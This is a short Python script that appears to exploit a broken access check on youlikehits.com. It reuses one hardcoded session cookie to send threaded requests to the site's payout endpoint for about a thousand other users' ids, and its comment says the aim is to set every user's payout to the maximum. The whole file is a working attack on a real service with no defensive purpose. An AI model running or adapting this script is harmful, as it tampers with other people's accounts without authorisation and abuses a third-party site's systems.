import requests
from requests.structures import CaseInsensitiveDict
import threading
import time

# requests
def get(user):
    url = "https://www.youlikehits.com/newaddyoutube.php?step=payout&id=" + str(user) + "&payout=35"
    headers = CaseInsensitiveDict()
    headers["Cookie"] = "PHPSESSID=e0025e19ef508d7c5cb7ae7ce39e7c30;LBSESSIONID=B|YhBrd|YhBbD;"
    resp = requests.get(url, headers=headers)
    msg = resp.text.split('<br>')[0]
    print(msg)

# increase Payout to Max For all users
def incPayout():
    for user in range(1474000, 1475000):
        if user != 1474556:
            threading.Thread(target=get, args=(user,)).start()
            time.sleep(0.3) 

# start up the shit
incPayout()